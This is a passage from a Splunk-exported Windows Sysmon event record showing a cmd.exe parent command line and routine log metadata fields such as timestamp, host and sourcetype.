C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\"","_time":"2021-02-21T11:46:38.000-0800","date_hour":"11","date_mday":"21","date_minute":"46","date_month":"february","date_second":"38","date_wday":"sunday","date_year":"2021","date_zone":"local","host":"DESKTOP-3U2S6EJ","index":"main","linecount":"37","punct":"//_::_=--/===-==---==--====__(:_)==_:\\r:_=.,=__\\r:_-","source":"WinEventLog:Microsoft-Windows-Sysmon/Operational","sourcetype":"WinEventLog:Microsoft-Windows-Sysmon/Operational","splunk_server":"DESKTOP-3U2S6EJ","timeendpos":"23","timestartpos":"0"}}
